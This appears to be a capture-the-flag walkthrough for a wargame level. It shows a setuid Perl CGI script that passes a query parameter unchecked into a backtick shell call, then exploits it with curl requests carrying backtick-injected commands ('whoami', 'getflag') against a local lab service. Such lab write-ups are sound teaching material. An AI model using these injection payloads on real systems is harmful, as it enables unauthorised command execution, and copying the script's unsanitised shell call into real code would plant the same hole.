# Level 04


<br>

### >> [Flag file](../flag) <<

<br>


## Explanation:


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
> d--x--x--x  1 root    users    340 Aug 30  2015 ..
> -r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
> -r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
> -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
> -r-x------  1 level04 level04  675 Apr  3  2012 .profile
> ```
> There is a file called `level04.pl` that is readable and executable by the user `flag04`.


#### Step 2:

- What's in it?
```bash
cat level04.pl
```

> ```perl
> #!/usr/bin/perl
> # localhost:4747
> use CGI qw{param};
> print "Content-type: text/html\n\n";
> sub x {
>   $y = $_[0];
>   print `echo $y 2>&1`;
> }
> x(param("x"));
> ```

> So we can do something like:
> ```bash
> ./level04.pl x=abc123
> ```
> ```
> Content-type: text/html
>
> abc123
> ```

> But also:
> ```bash
> curl 'localhost:4747?x=abc123'
> ```
> ```
> abc123
> ```


#### Step 3:

- Because it executes the `echo` command without checking the input, we can use command injection to execute arbitrary commands.

> ```bash
> curl 'localhost:4747?x=`whoami`'
> ```
> ```
> flag04
> ```

- So let's get the flag:
```bash
curl 'localhost:4747?x=`getflag`'
```


<br>

---

[<<](/level03/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level05/resources/Readme.md)
